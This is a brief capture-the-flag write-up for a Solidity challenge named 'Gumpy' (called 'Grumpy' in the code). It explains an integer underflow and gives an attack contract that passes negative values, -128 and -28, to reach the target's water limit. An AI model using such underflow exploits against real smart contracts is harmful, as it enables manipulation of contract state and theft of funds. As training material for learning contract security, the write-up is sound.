# Gumpy

## Solution

To validate this challenge, it's necessary to give a quantity of water to "Gumpy" equal to the limit that it can receive, however this limit can't be reached with an addition of positive unit.
So to validate this challenge, you have to give a certain number of negative unit in order to create an underflow to be able to reach the value of the maximum quantity of water that can be given to "Gumpy".

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../../levels/hardChalls/Grumpy.sol";

contract GrumpyAttack {

    Grumpy originalContract;

    constructor(address payable _originalContract) public {
        originalContract = Grumpy(_originalContract);
    }

    function exploit() public {
        originalContract.giveWaterToGrumpy(-128);
        originalContract.giveWaterToGrumpy(-28);
    }

}
```